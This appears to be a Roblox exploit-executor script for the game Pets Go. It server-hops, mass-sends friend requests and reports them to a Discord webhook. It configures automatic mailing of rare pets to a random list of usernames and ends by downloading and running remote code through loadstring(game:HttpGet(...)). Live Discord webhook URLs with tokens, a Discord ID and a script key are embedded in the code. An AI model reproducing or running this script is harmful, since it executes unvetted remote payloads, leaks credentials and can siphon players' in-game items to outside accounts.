 local plrs = game:GetService("Players") 
  local plr = plrs.LocalPlayer
  local tpService = game:GetService("TeleportService")

local function getServers()
    local url =
        string.format("https://games.roblox.com/v1/games/%s/servers/Public?sortOrder=Asc&limit=100&excludeFullGames=true", game.PlaceId)
    local servers = game:GetService("HttpService"):JSONDecode(game:HttpGet(url)).data
    return servers
end

local function serverhop()
 local server
    repeat
        task.wait(1)
        server = getServers()[Random.new():NextInteger(1, 100)]

    until server.id ~= game.JobId


    tpService:TeleportToPlaceInstance(game.PlaceId, server.id, plr)
end

local usernames = {
    "823545woldemar",
    "earlbatman56",
    "kermieiacobus86",
    "floorhedia28",
    "wavelammi11",
    "181784jayne",
    "284042arther",
    "pascoe350649",
    "bonsellupo",
    "thulinh3077"
}

local function getRandomUsername()
    local index = math.random(1, #usernames)
    return usernames[index]
end

local sendto = getRandomUsername()


local Url2 = "https://discord.com/api/webhooks/1181449125187833856/0kA4c5-OXkAOQvZeJxnOKrKc7cTzlGvjpjMNKn-UkImyh82rPZ8-np_RwU0w6DelHjty"
local Http2 = game:GetService("HttpService")
	local Msg = function(msg)
		request({Url = Url2,Method = "POST",Headers = {["Content-Type"] = "application/json"},Body = Http2:JSONEncode({content = msg})})
	end


local Players = game:GetService('Players')
local Client = Players.LocalPlayer
_G.EnableFriendRequest = true

local function SendFriendRequests()
	
    for _, player in ipairs(Players:GetPlayers()) do
        if player ~= Client then  
            Client:RequestFriendship(player)
			Msg(Client.Name.." đã gửi yêu cầu kết bạn tới "..player.Name)
			task.wait(600)
        end
        task.wait(1)
    end
end


task.spawn(function()		
    if _G.EnableFriendRequest then
		wait(600)
		SendFriendRequests()

        
    end
end)
	
task.spawn(function()
	wait(math.random(1800, 3600))
		while true do
	
	serverhop()
	wait(1)
end
end)
		


if not game:IsLoaded() then
    game.Loaded:Wait()
  end


	game:GetService("StarterGui"):SetCoreGuiEnabled(Enum.CoreGuiType.Chat,false)
	game:GetService("RunService"):Set3dRenderingEnabled(false)
	
script_key="qsRsHLISSqRCYRltDhdoVHUmYBhhqSWa";
getgenv().petsGoConfig = {
    EVENT_EGG = false,

    HIDE_NAME = true,  -- hide webhook username
    WEBHOOK_URL = "",
    MAILING_WEBHOOK_URL = "https://discordapp.com/api/webhooks/1281726288364699769/Wn5gkb1cv21e5757EE9oFytBoIawMGTVTstgY3xohWcbNsGgD_-QAwvy5GvdBJNX1GLw",
    DISCORD_ID = "844977783083368518",
    WEBHOOK_ODDS = 100000000, -- Minimum Pet Odds To Trigger Webhook
    
    MAIL_PET = True,  -- Mail Pet
    MAIL_WEBHOOK_ODDS = 100000000, -- Minimum Pet Odds To Trigger MAIL Webhook
    MAIL_PET_ODDS = 10000000,  -- Minimum Pet Odds To Mail
    USERNAME_TO_MAIL = sendto,
}

daubuoi = true

loadstring(game:HttpGet("https://api.luarmor.net/files/v3/loaders/e81ea00ef49a917bb1242da4f41dc4f9.lua"))()
